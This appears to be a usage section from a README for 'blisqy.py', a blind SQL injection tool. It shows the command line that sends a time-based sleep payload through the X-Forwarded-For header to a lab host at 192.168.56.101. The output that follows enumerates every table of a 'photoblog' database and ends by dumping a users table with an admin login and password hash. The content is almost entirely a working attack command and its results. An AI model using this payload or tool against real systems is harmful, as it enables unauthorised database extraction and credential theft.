## Dig up all teh DB stuff:


### Command
```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes 
            --sleeptime 0.1 --interactive off --inject "' or if((*sql*),sleep(*time*),0) and '1'='1"
```

### Out-put
```bash
[+] Getting Current Database : 
[-] photoblog


[+] Getting  number of TABLES from Schema 
[-] 4


[+] Getting  all TABLE NAMES from Schema 
[-] categories
[-] pictures
[-] stats
[-] users
Preparing to Enumerate Table : categories
=====================================================
[+] Getting Number of Columns in Table : categories
[-] 2


[+] Getting  all Column Names in Table : categories 
[-] id
[-] title


[+] Getting number of Rows in Table : categories 
[-] 3


[+] Getting data from Table : categories 
[-] id:title
[-] 1:test
[-] 2:ruxcon
[-] 3:2010
Preparing to Enumerate Table : pictures
=====================================================
[+] Getting Number of Columns in Table : pictures
[-] 4


[+] Getting  all Column Names in Table : pictures 
[-] cat
[-] id
[-] img
[-] title


[+] Getting number of Rows in Table : pictures 
[-] 3


[+] Getting data from Table : pictures 
[-] cat:id:img:title
[-] 1:2:ruby.jpg:Ruby
[-] 1:3:cthulhu.png:Cthulhu
[-] 2:1:hacker.png:Hacker
Preparing to Enumerate Table : stats
=====================================================
[+] Getting Number of Columns in Table : stats
[-] 2


[+] Getting  all Column Names in Table : stats 
[-] count
[-] ip


[+] Getting number of Rows in Table : stats 
[-] 1


[+] Getting data from Table : stats 
[-] count:ip
[-] 1:0
Preparing to Enumerate Table : users
=====================================================
[+] Getting Number of Columns in Table : users
[-] 3


[+] Getting  all Column Names in Table : users 
[-] id
[-] login
[-] password


[+] Getting number of Rows in Table : users 
[-] 1


[+] Getting data from Table : users 
[-] id:login:password
[-] 1:admin:8efe310f9ab3efeae8d410a8e0166eb2
```
